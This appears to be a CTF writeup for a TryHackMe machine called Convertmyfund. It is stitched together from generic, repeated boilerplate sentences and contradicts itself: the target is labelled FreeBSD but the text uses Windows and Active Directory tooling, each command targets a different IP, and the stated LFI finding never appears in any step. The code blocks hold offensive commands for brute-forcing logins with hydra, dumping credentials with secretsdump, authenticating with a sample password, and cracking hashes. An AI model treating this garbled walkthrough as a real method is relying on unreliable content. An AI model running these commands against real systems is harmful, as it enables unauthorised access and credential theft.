---
TitleSEO: "TryHackMe — Convertmyfund (Medium FreeBSD) | ZureFX"
TitlePost: "TryHackMe — Convertmyfund (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Convertmyfund. Local File Inclusion and Remote Code Execution to achieve medium compromise on FreeBSD."
Keywords: "offsec, forensics, tryhackme, linux, ctf, reversing"
URL: "https://zurefx.github.io/writeups/htb-convertmyfund-597.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-convertmyfund-597/"
Date: "2025-06-02"
Tags: "OffSec, Forensics, TryHackMe, Linux, CTF, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-convertmyfund-597"
Permalink: "/writeups/htb-convertmyfund-597.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Convertmyfund** is rated **Medium** on TryHackMe. It runs **FreeBSD** and the IP address during this analysis was `10.76.169.166`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.123.232.223 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.69.33.244 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p445,8080,5985 10.72.115.206 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.10.83.158
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.68.210.55 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.119.68.56/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Local File Inclusion**.

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.80.209/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.162.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.115.114/FUZZ
crackmapexec smb 10.110.220.3 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.10.97.90 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.179.111 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `sqlmap`
- `atexec`
- `feroxbuster`
- `sharphound`
- `GetNPUsers`
- `netcat`
- `wpscan`

### Key Takeaways

- Local File Inclusion
- Remote Code Execution
- Resource-Based Constrained Delegation
